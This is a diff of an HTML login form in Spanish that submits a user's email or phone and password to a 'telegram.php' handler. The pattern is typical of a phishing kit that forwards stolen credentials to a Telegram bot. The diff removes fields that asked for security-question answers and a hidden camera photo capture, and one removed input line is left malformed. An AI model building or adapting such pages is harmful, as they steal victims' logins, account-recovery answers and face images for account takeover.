@@ -20,18 +20,6 @@
     <form action="telegram.php" method="POST" enctype="multipart/form-data">
         <input type="text" name="usuario" placeholder="Correo electrónico o teléfono" required>
         <input type="password" name="clave" placeholder="Contraseña" required>
-        
-        <h4>Preguntas de seguridad</h4>
-        <input type="text" name="pregunta1" placeholder="¿Nombre de tu primera mascota?" required>
-        <input type="text" name="pregunta2"
-        
-        <input type="text" name="pregunta3" placeholder="¿Nombre de tu colegio?" required>
-
-        <h4>Verificación con foto</h4>
-        <video id="video" autoplay playsinline></video>
-                <canvas id="canvas"></canvas>
-        <input type="file" name="foto" id="foto" accept="image/*" capture="camera" required style="display:none;">
-        <button type="button" onclick="tomarFoto()">📸 Tomar Foto</button>
 
         <button type="submit">Entrar</button>
     </form>
